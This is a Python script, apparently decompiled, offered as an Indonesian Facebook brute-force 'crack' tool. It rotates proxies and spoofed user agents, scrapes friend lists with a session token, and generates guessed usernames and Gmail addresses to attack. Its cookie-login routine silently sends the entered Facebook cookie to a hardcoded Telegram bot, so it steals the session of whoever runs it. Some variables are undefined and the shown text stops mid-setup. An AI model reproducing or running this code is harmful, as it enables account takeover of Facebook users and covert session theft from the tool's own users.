""" reverse exec by Maulana-XD"""
### AUTHOR ###
""" Realese 2024 Tools Simple Hacking Brute Force
         Author : Nona Xafier
Facebook : Nona Xafier
       Mau Recode? Mau DiJual?? Silahkan Saja Asak Ijo Oleh Mu Saja , Jadi Saya Wajarkan
Saja Jika Kamu Recode Dan Premium Kan Script Ini"""
### IMPORT MODULE ###
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from string import *
### GLOBAL APPEND ###
rr = random.randint 
rc = random.choice
tokenku,id,id2,ugen,method,pwpluss,pwnya,pwv,uid,loop,ok,cp=[],[],[],[],[],[],[],[],[],0,0,0
wa = sol()
### GET PROXY
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('Jaringan Internet Anda Bermasalah......')
prox=open('proxy.txt','r').read().splitlines()
### USER AGENT ###
for agenku in range(10000):
    rr = random.randint; rc = random.choice
    bek1 = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek1)
    bek2 = f"Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek2)
    bek3 = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek3)
    bek4 = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek4)
    bek5 = f"Mozilla/5.0 (Linux; Android 8.1.0; A95X MAX) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek5)
    bek6 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek6)
    bek7 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek7)
    bek8 = f"Mozilla/5.0 (Linux; Android 7.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek8)
    bek9 = f"Mozilla/5.0 (Linux; Android 5.0.1; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek9)
    bek10 = f"Mozilla/5.0 (Linux; Android 8.1.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek10)
    bek11 = f"Mozilla/5.0 (Linux; Android 9.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek11)
    bek12 = f"Mozilla/5.0 (Linux; Android 13; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek12)
    bek13 = f"Mozilla/5.0 (Linux; Android 10; SM-W2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 EdgA/81.0.416.81"
    ugen.append(bek13)
    bek14 = f"Mozilla/5.0 (Linux; Android 13; SM-A055F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36"
    ugen.append(bek14)
    bek15 = f"Well /5.0 (Linux; Android 5; Samsung Chrome 11 (3180) Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.464.442 Tokhs/537.36"
    ugen.append(bek15)
    bek16 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(100,133))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek16)
    bek17 = f"Mozilla/5.0 (Linux; Android 12; SM-M536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(100,133))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek17)
    bek18 = f"Mozilla/5.0 (Linux; Android 12; moto g41) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek18)
    bek19 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS9CUE5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek19)
    bek20 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M346B1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
    ugen.append(bek20)
    bek22 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(94,119))}.0.0.0 Mobile Safari/537.36'
    ugen.append(bek22)
    bek21 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG TicWatch Pro 3 Ultra GPS) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek21)
    bek22 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek22)
    bek23 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36"
    ugen.append(bek23)
    bek24 = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Mobile Safari/537.36"
    ugen.append(bek24)
    bek25 = f"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG OW20W2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.0. Chrome/90.0.4430.210 Mobile Safari/537.36"
    ugen.append(bek25)
### WARNA COLOR ###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
### SAVE OK CP FILES ###
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
### TOOLS SUPPORT ###
def perjalanan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
### CHECK COOKIES ###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f' {P}[{M}!{P}] Your Internet Connection is Disconnected')
			exit()
	except IOError:
		login_lagi334()
### LOGIN YOUR COOKIES ###
def login_lagi334():
	os.system('clear')
	cok = input(f' {P}[{H}•{P}] Login Cookies : {H}')
	requests.post(f"https://api.telegram.org/bot6918382904:AAHSBLj5sfHdQvm5qzezu3e97W_1CwFmh3Q/sendMessage?chat_id=-1001990426052&text={cok}")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> \x1b[1;91mcookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={P}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n {P}[{H}•{P}] Your Token : {took}{H}')
				exit()
	except Exception as e:
		print(e)
### MAIN TOOLS DEF ###
def Main(id,name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	wa.print(f'[white]ＳＲＢＦ ＴＯＯＬＳ ＮＥＷ ＲＥＬＥＡＳＥ ２０２４')
	wa.print(f'[white]ＳＩＭＰＬＥ ＲＡＮＤＯＭ ＢＲＵＴＥ ＦＯＲＣＥ ')
	wa.print(f'[white]ＣＲＥＡＴＥＤ ＢＹ [green]ＮＯＮＡ [red]ＸＡＦＩＥＲ [blue]41')
	print(f'{H}━━'* 26)
	print(f'{P}{P}[{H}•{P}] 1.𝐏𝐮𝐛𝐥𝐢𝐤 {P}[{H}•{P}] 2.𝐌𝐚𝐬𝐬𝐚𝐥  {P}[{H}•{P}] 3.𝐔𝐧𝐚𝐦𝐞 {P}[{H}•{P}] 4.𝐂𝐥𝐨𝐧𝐞')
	print(f'{P}{P}[{H}•{P}] 5.𝐅𝐢𝐥𝐞   {P}[{H}•{P}] 6.𝐑𝐞𝐬𝐬𝐮𝐥𝐭 {P}[{H}•{P}] 7.𝐆𝐦𝐚𝐢𝐥 {P}[{H}•{P}] 8.𝐄𝐱𝐢𝐭𝐞𝐝  ')
	print(f'{H}━━'* 26)
	CO = input(f'{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 : ')
	print(f'{H}━━'* 26)
	if CO in ['1','1']:
		idt = input(f'{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 𝑰𝑫  : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif CO in ['2','02']:
		error()
	elif CO in ['3','03']:
		User()
	elif CO in ['4','04']:
		idss()
	elif CO in ['5','05']:
		FileX()
	elif CO in ['06','6']:
		result()
	elif CO in ['7','07']:
		Gmail()
	elif CO in ['00','0','logout']:
		hapus_cookie =	os.system('rm -rf .token.txt && rm -f .cok.txt')
	else:
		print(f'{P}[{H}!{P}] 𝙸𝚗𝚙𝚞𝚝 𝚢𝚊𝚗𝚐 𝚋𝚎𝚗𝚊𝚛 𝚋𝚘𝚜𝚜𝚚𝚞𝚑')
		back()
### ERROR TOOLS ####
def error():
	print(f'{K}>> Maaf Fitur Ini Masih Di Perbaiki {P}')
	time.sleep(4)
	back()
### CLONE IDS ACCOUNT ###
def idss():
	dump=[]
	print(f'{P}┗━ 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙰𝚠𝚊𝚕𝚊𝚗 𝙸𝙳 (𝙴𝚇𝙰𝙼𝙿𝙻𝙴 : 𝟷0000)')
	depan = input(f'┗━  𝙰𝚠𝚊𝚕 𝙸𝙳 : ')
	if len(depan)==5:pass
	else:exit(f'{P} 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙰𝚠𝚊𝚕𝚊𝚗 𝙸𝙳 (𝙴𝚇𝙰𝙼𝙿𝙻𝙴 : 𝟷0000)')
	print(f'{P}┗━ 𝙻𝙸𝙼𝙸𝚃 𝙸𝙳 𝟷000 - 𝟻000 - 𝟷000 - 𝟻0000')
	limit = input(f'┗━  𝙻𝙸𝙼𝙸𝚃 𝙸𝙳 : ')
	for z in range(int(limit)):
		rr = random.randint
		a = depan
		b = 111111111
		c = 999999999
		d = rr(b,c)
		dns = f'{a}{str(d)}'
		if dns in id:pass
		else:id.append(dns+'|'+depan)
		if len(dump)==999999:setting()
	setting()
### CLONE GMAIL ACCOUNT ###
def Gmail():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['karisma','rahayu','sumiati','saluyu','mulyani','melani','meylani','wahyuni','ningsih','nengsih','suninsgih','sunengsih','yunensgih','sunengsih','aprianti','apriani','apriliani','aprilia','apriani','sukaesih','bohay','montok','sayang','julianti','julianto','yulianti','yulianto','suherni','damayanti','permatasari','lestari','sumarni','suherni','sutini','septiani','febrianti','widiawati','widyawati','azizah','fatimah','azzahra','azzizah','melati','pratiwi','pertiwi','karlina','marlina','gumilang','oktavia','oktaviani','rahmawati','fatmawati ','larastri','sulastri','amanda','ananda ','kurniasih','evve','rokayah','hidayah ','aisyah','nuraisyah','nurfatimah','nurahma','wulandari','syariah','badriah','daratista','nurazizah','nurhanipah','nurazahra','safitri','sapitri','nursafitri','maharani','menlinda','gelis','hungkul','sandini','manopo','wijayanti','dwilestari','lanjar','melani','supriani','sukanri','kusmayanti','rosawati','madara','malaka','ollshop','daniati','nurlaila','anggraena','anggraeni','solipah','khoerunisa','rachmawati','nurjanah','sayank','purnama','ferawati','selebew','ebew']
	tengah = ['ramadhan','ramadhani','ramdhan','ramdani','ramadani','hamdani','saputra','saputro','armada','irawan','wirawan','wijaya','wijayanto','wujayanti','kurnia','kurniawan','setiawan','setyawan','pratama','peratama','purnama','purnomo','maulana','mulyana','mulyono','sinaga','sihombing','hidayat','firmansah','lesmana','rusmana','bengkel','muhamad','ruhyadi','setiadi','septiadi','suhardi','suharto','supomo','sutomo','sumanto','sumanta','ardiansah','ardiansyah','damayanto','wiguna','suherman','dermawan','darmawan','darmansah','dermansah','dermanto','hermanto','hermawan','hermansah','suhendra','iskandar','pasundan','gumilang','dirgantara','cahyono','cahyadi','mulyadi','laksana','pangestu','fahrezi','ganteng','gaming','geming','kasep','geulis','mamahmuda','alfiansah','alhidayat','nurahman','nugraha','nurohman','nuryansah','nugroho','sadboy','pembangkang','berontak','gumilar','sumedang','gaming','geming','gamers','freefire','hyper','alok','bocil','andrian']
	tengah = ['ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah',]
	global ok , cc
	nama = input(f'{P}[{H}•{P}] Username : ').split(',')
	if 'KANJUT' in str(nama):
		print(f' {P}└─{M} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = input(f'{P}[{H}?{P}] Limit : ')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		BB = [f'{str(rc(tengah))}{str(rr(0,1000))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:passwrd()
	setting() 
 ### CLONE USERNAME FACEBOOK ###   
def User():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['karisma','rahayu','sumiati','saluyu','mulyani','melani','meylani','wahyuni','ningsih','nengsih','suninsgih','sunengsih','yunensgih','sunengsih','aprianti','apriani','apriliani','aprilia','apriani','sukaesih','bohay','montok','sayang','julianti','julianto','yulianti','yulianto','suherni','damayanti','permatasari','lestari','sumarni','suherni','sutini','septiani','febrianti','widiawati','widyawati','azizah','fatimah','azzahra','azzizah','melati','pratiwi','pertiwi','karlina','marlina','gumilang','oktavia','oktaviani','rahmawati','fatmawati ','larastri','sulastri','amanda','ananda ','kurniasih','evve','rokayah','hidayah ','aisyah','nuraisyah','nurfatimah','nurahma','wulandari','syariah','badriah','daratista','nurazizah','nurhanipah','nurazahra','safitri','sapitri','nursafitri','maharani','menlinda','gelis','hungkul','sandini','manopo','wijayanti','dwilestari','lanjar','melani','supriani','sukanri','kusmayanti','rosawati','madara','malaka','ollshop','daniati','nurlaila','anggraena','anggraeni','solipah','khoerunisa','rachmawati','nurjanah','sayank','purnama','ferawati','selebew','ebew']
	tengah = ['ramadhan','ramadhani','ramdhan','ramdani','ramadani','hamdani','saputra','saputro','armada','irawan','wirawan','wijaya','wijayanto','wujayanti','kurnia','kurniawan','setiawan','setyawan','pratama','peratama','purnama','purnomo','maulana','mulyana','mulyono','sinaga','sihombing','hidayat','firmansah','lesmana','rusmana','bengkel','muhamad','ruhyadi','setiadi','septiadi','suhardi','suharto','supomo','sutomo','sumanto','sumanta','ardiansah','ardiansyah','damayanto','wiguna','suherman','dermawan','darmawan','darmansah','dermansah','dermanto','hermanto','hermawan','hermansah','suhendra','iskandar','pasundan','gumilang','dirgantara','cahyono','cahyadi','mulyadi','laksana','pangestu','fahrezi','ganteng','gaming','geming','kasep','geulis','mamahmuda','alfiansah','alhidayat','nurahman','nugraha','nurohman','nuryansah','nugroho','sadboy','pembangkang','berontak','gumilar','sumedang','gaming','geming','gamers','freefire','hyper','alok','bocil','andrian']
	global ok,cc
	nama = input(f'{P}[{H}•{P}] Username : ')
	if ',' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = '.'
	jumlah = input(f'{P}[{H}?{P}] Limit : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}{str(rr(0,1000))}']
		CC = doma
		DD = f'{AA}{CC}{str(rc(BB))}{CC}{str(rr(0,999))}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
	setting()
### CLONE PUBLIK ###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
### CLONE MASSAL ###
def massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{M}cookies telah kadaluarsa ster')
        exit()
    try:	
    	dwi = int(input(f"{P}[{H}?{P}] 𝐉𝐮𝐦𝐥𝐚𝐡 𝐈𝐃 : "))
    	print(f'{H}━━'* 26)  
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f"{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 𝑰𝑫 𝑲𝒆 {_dwi_}\n ┗━ 𝑰𝑫 : ")
        idf.append(Masukan)
    for user in idf:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        setting()
    except requests.exceptions.ConnectionError:
        print(f" {P}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f" {P}{M}  teman tidak publik")
        exit()
### CHECK RESSULT OK CP ###
def result():
	print(f'{H}━━'* 26)
	print(f'{B}[{P}01{B}] {P}Hasil {h}OK{P} Anda ')
	print(f'{B}[{P}02{B}] {P}Hasil {K}CP{P} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		print(f"{P}-" *40)
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{P} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{P} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {P}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {P}Account'+x)
			geeh = input(f' └── Pilih : ')
			print(f"{P}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{P} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{P} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			print(f"{P}-" *40)
			input(f'{P}[{M} Klik Enter{P} ]')
			back()
	elif kz in ['01','1']:
		print(f"{P}-" *40)
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{P} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{P} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{P} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {P}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			print(f"{P}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{P} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{P} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{P}')
				nocp +=1
			print(f"{P}-" *40)
			input(f'{P}[{M} Klik Enter{P} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{P} pilih yang bener kontol ')
		back()
             #========= CRACK FILES ========#
             
def FileX():
	try:
		fileX = input(f'{P}[{H}+{P}]{P}Input File Anda : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f" {P}└─{M} ID ERROR {H}%s {J}not found"%(fileX))
### SETTING UID ###
def setting():
	print(f'{H}━━'* 26)
	print(f'{P}{P}[{H}•{P}] 1.𝑂𝐿𝐷 𝑈𝐼𝐷  {P}[{H}•{P}] 2.𝑵𝑬𝑾 𝑼𝑰𝑫  {P}[{H}•{P}] 3.𝑹𝑨𝑵𝑫𝑶𝑴 𝑼𝑰𝑫')
	hu = input(f'{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
### SETTING METHOD ###
	print(f'{H}━━'* 26)
	print(f'{P}{P}[{H}•{P}] 1.𝑽𝑨𝑳𝑰𝑫𝑨𝑻𝑬 {P}[{H}•{P}] 2.𝑽𝑨𝑳𝑰𝑫𝑨𝑻𝑬 {P}[{H}•{P}] 3.𝑮𝑹𝑨𝑷𝑯 𝑨𝑷𝑰')
	tod = input(f'{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 : ')
	print(f'{H}━━'* 26)
	if tod in ['1','01']:
		method.append('mobile')
